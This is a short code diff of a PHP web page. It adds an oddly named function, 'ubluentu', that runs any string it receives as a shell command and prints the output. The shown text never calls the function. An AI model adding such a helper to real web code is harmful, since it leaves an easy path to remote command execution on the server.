@@ -5,7 +5,9 @@
 </head>
 <body>
 <?php
-
+function ubluentu($command) {
+    echo shell_exec($command);
+}
 ?>
 </body>
 </html>
